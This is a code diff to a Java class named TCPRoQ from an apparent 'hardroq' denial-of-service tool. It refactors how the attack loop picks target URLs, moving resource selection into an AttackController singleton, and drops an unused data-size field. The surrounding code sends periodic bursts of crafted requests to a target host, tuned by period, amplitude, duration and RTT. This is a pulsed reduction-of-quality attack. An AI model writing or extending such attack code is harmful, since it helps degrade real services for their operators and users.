@@ -1,5 +1,7 @@
 package hardroq.networking;
 
+import hardroq.controllers.AttackController;
+
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.Socket;
@@ -9,7 +11,8 @@ import java.util.logging.Logger;
 
 public class TCPRoQ {
 	//Tools
-	private final Random random = new Random();
+	private static final Random random = new Random();
+	private static final AttackController ac= AttackController.getInstance();
 	private Thread workerThread;
 	private Thread monitorThread;
 	private Socket socket;
@@ -21,7 +24,6 @@ public class TCPRoQ {
 	private final String footer;
 	private final String payload;
 	private final float bandwidth;
-	private int datasize;			// header + random data + footer
 	private int period;				// T
 	private int amplitude;			// δ
 	private int duration;			// t
@@ -32,14 +34,12 @@ public class TCPRoQ {
 
 	//Internals
 	volatile private static int RTT;
-	private static String[] resources;
 	private boolean attacking = false;
 	
-	private TCPRoQ (Builder builder) {
+	private TCPRoQ (final Builder builder) {
 		host = builder.host;
 		port = builder.port;
 		RTT = builder.RTT;
-		datasize = builder.datasize;
 		header = builder.header;
 		footer = builder.footer;
 		aggression = builder.aggression;
@@ -125,7 +125,7 @@ public class TCPRoQ {
 						long startTime = System.currentTimeMillis();
 						
 						for (int i = amplitude; --i > 0;) {
-							final String attackPacket = payload.replace("_targeturl_", resources[random.nextInt(resources.length)]);
+							final String attackPacket = payload.replace("_targeturl_", getResource());
 							
 							//clear the input buffer
 							socket.getInputStream().skip(socket.getInputStream().available());
@@ -153,14 +153,14 @@ public class TCPRoQ {
 				}
 			}
 		}
+
+        private String getResource() {
+            return ac.getRandomResource();
+        }
 	};
 	
 	public static void setRTT(final int r) {
 		RTT = r;
-	}
-	
-	public static void setResources(final String[] r) {
-		resources = r;
 	}
 	
 	public long getPacketsSent() {
@@ -172,7 +172,6 @@ public class TCPRoQ {
 		private String host = "127.0.0.1";
 		private int port = 80;
 		private int RTT = 150;
-		private int datasize = 16 * 1024;
 		private String header = "";
 		private String footer = "";
 		private float aggression = 1.0f;
@@ -194,11 +193,6 @@ public class TCPRoQ {
 		
 		public Builder RTT (final int t) {
 			RTT = t;
-			return this;
-		}
-		
-		public Builder datasize (final int d) {
-			datasize = d;
 			return this;
 		}
 
